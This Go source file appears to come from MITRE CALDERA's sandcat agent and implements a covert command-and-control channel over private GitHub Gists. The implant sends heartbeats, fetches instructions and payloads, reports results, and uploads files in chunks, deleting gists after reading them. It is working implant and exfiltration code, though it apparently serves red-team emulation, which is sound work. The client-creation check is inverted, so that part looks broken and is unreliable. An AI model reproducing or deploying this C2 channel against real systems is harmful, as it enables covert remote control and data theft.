package contact

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"math"
	"time"

	"github.com/mitre/gocat/output"

	"github.com/google/go-github/github"
	"golang.org/x/oauth2"
)

const (
	githubTimeout = 60
	githubTimeoutResetInterval = 5
	githubError = 500
	gistBeaconResponseFailThreshold = 3 // number of times to attempt fetching a beacon gist response before giving up.
	gistBeaconWait = 20 // number of seconds to wait for beacon gist response in case of initial failure.
	gistMaxDataChunkSize = 750000 // Github GIST has max file size of 1MB. Base64-encoding 786432 bytes will hit that limit
)

type GIST struct {
	name string
	token string
	username string
	client *github.Client
	clientGetter ClientGetter
}

type ClientGetter func(string) *github.Client

type GistFunctionHandles struct {
	clientGetter ClientGetter
}

func getGithubClient(token string) *github.Client {
	ctx := context.Background()
	ts := oauth2.StaticTokenSource(
		&oauth2.Token{AccessToken: token},
	)
	tc := oauth2.NewClient(ctx, ts)
	return github.NewClient(tc)
}

func GenerateGistContactHandler(funcHandles *GistFunctionHandles) *GIST {
	return &GIST{
		name: "GIST",
		clientGetter: funcHandles.clientGetter,
	}
}

func init() {
	gistFuncHandles := &GistFunctionHandles{
		clientGetter: getGithubClient,
	}
	CommunicationChannels["GIST"] = GenerateGistContactHandler(gistFuncHandles)
}

//GetInstructions sends a beacon and returns instructions
func (g *GIST) GetBeaconBytes(profile map[string]interface{}) []byte {
	checkValidSleepInterval(profile, githubTimeout, githubTimeoutResetInterval)
	var retBytes []byte
	bites, heartbeat := g.gistBeacon(profile)
	if heartbeat == true {
		retBytes = bites
	}
	return retBytes
}

//GetPayloadBytes load payload bytes from github
func (g *GIST) GetPayloadBytes(profile map[string]interface{}, payloadName string) ([]byte, string) {
	var payloadBytes []byte
	var err error
	if _, ok := profile["paw"]; !ok {
		output.VerbosePrint("[!] Error obtaining payload - profile missing paw.")
		return nil, ""
	}
	payloads := g.getGists("payloads", fmt.Sprintf("%s-%s", profile["paw"].(string), payloadName))
	if payloads[0] != "" {
		payloadBytes, err = base64.StdEncoding.DecodeString(payloads[0])
		if err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] Failed to decode payload bytes: %s", err.Error()))
			return nil, ""
		}
	}
	return payloadBytes, payloadName
}

//C2RequirementsMet determines if sandcat can use the selected comm channel
func (g *GIST) C2RequirementsMet(profile map[string]interface{}, criteria map[string]string) (bool, map[string]string) {
    config := make(map[string]string)
    if len(criteria["c2Key"]) > 0 {
        g.token = criteria["c2Key"]
        if len(profile["paw"].(string)) == 0 {
        	config["paw"] = getRandomIdentifier()
        }
        return g.createNewClient(), config
    }
    return false, nil
}

func (g *GIST) SetUpstreamDestAddr(upstreamDestAddr string) {
	// Upstream destination will be the github API.
	return
}

//SendExecutionResults send results to the server
func (g *GIST) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}){
	profileCopy := make(map[string]interface{})
	for k,v := range profile {
		profileCopy[k] = v
	}
	results := [1]map[string]interface{}{result}
	profileCopy["results"] = results
	g.gistResults(profileCopy)
}

func (g *GIST) GetName() string {
	return g.name
}

func (g *GIST) UploadFileBytes(profile map[string]interface{}, uploadName string, data []byte) error {
	encodedFilename := base64.StdEncoding.EncodeToString([]byte(uploadName))
	paw := profile["paw"].(string)

	// Upload file in chunks
	uploadId := getRandomIdentifier()
	dataSize := len(data)
	numChunks := int(math.Ceil(float64(dataSize) / float64(gistMaxDataChunkSize)))
	start := 0
	gistName := getGistNameForUpload(paw)
	for i := 0; i < numChunks; i++ {
		end := start + gistMaxDataChunkSize
		if end > dataSize {
			end = dataSize
		}
		chunk := data[start:end]
		gistDescription := getGistDescriptionForUpload(uploadId, encodedFilename, i+1, numChunks)
		if err := g.uploadFileChunkGist(gistName, gistDescription, chunk); err != nil {
			return err
		}
		start += gistMaxDataChunkSize
	}
	return nil
}

func getGistNameForUpload(paw string) string {
	return getDescriptor("upload", paw)
}

func getGistDescriptionForUpload(uploadId string, encodedFilename string, chunkNum int, totalChunks int) string {
	return fmt.Sprintf("upload:%s:%s:%d:%d", uploadId, encodedFilename, chunkNum, totalChunks)
}

func (g *GIST) uploadFileChunkGist(gistName string, gistDescription string, data []byte) error {
	if result := g.createGist(gistName, gistDescription, data); result != created {
		return errors.New(fmt.Sprintf("Failed to create file upload GIST. Response code: %d", result))
	}
	return nil
}

func (g *GIST) gistBeacon(profile map[string]interface{}) ([]byte, bool) {
	failCount := 0
	heartbeat := g.createHeartbeatGist("beacon", profile)
	if heartbeat {
		//collect instructions & delete
		for failCount < gistBeaconResponseFailThreshold {
			contents := g.getGists("instructions", profile["paw"].(string));
			if contents != nil {
				decodedContents, err := base64.StdEncoding.DecodeString(contents[0])
				if err != nil {
					output.VerbosePrint(fmt.Sprintf("[-] Failed to decode beacon response: %s", err.Error()))
					return nil, heartbeat
				}
				return decodedContents, heartbeat
			}
			// Wait for C2 server to provide instruction response gist.
			time.Sleep(time.Duration(float64(gistBeaconWait)) * time.Second)
			failCount += 1
		}
		output.VerbosePrint("[!] Failed to fetch beacon response from C2.")
	}
	return nil, heartbeat
}

func (g *GIST) createHeartbeatGist(gistType string, profile map[string]interface{}) bool {
	data, err := json.Marshal(profile)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Gist heartbeat. Error with profile marshal: %s", err.Error()))
		output.VerbosePrint("[-] Heartbeat GIST: FAILED")
		return false
	} else {
		paw := profile["paw"].(string)
		gistName := getDescriptor(gistType, paw)
		gistDescription := gistName
		if g.createGist(gistName, gistDescription, data) != created {
			output.VerbosePrint("[-] Heartbeat GIST: FAILED")
			return false
		}
	}
	output.VerbosePrint("[+] Heartbeat GIST: SUCCESS")
	return true
}

func (g *GIST) gistResults(result map[string]interface{}) {
	data, err := json.Marshal(result)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Gist results. Error with result marshal: %s", err.Error()))
		output.VerbosePrint("[-] Results GIST: FAILED")
	} else {
		paw := result["paw"].(string)
		gistName := getDescriptor("results", paw)
		gistDescription := gistName
		if g.createGist(gistName, gistDescription, data) != created {
			output.VerbosePrint("[-] Results GIST: FAILED")
		} else {
			output.VerbosePrint("[+] Results GIST: SUCCESS")
		}
	}
}


func (g *GIST) createGist(gistName string, description string, data []byte) int {
	ctx := context.Background()
	stringified := base64.StdEncoding.EncodeToString(data)
	file := github.GistFile{Content: &stringified,}
	files := make(map[github.GistFilename]github.GistFile)
	files[github.GistFilename(gistName)] = file
	public := false
	gist := github.Gist{Description: &description, Public: &public, Files: files,}
	_, resp, err := g.client.Gists.Create(ctx, &gist)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[!] Error creating GIST: %s", err.Error()))
		return githubError
	}
	return resp.StatusCode
}

func (g *GIST) getGists(gistType string, uniqueID string) []string {
	ctx := context.Background()
	var contents []string
	gists, _, err := g.client.Gists.List(ctx, g.username, nil)
	if err == nil {
		for _, gist := range gists {
			if !*gist.Public && (*gist.Description == getDescriptor(gistType, uniqueID)) {
				fullGist, _, err := g.client.Gists.Get(ctx, gist.GetID())
				if err == nil {
					for _, file := range fullGist.Files {
						contents = append(contents, *file.Content)
					}
				}
				g.client.Gists.Delete(ctx, fullGist.GetID())
			}
		}
	}
	return contents
}

func (g *GIST) createNewClient() bool {
	client := g.clientGetter(g.token)
	if client != nil {
		return false
	}
	g.client = client
	return true
}
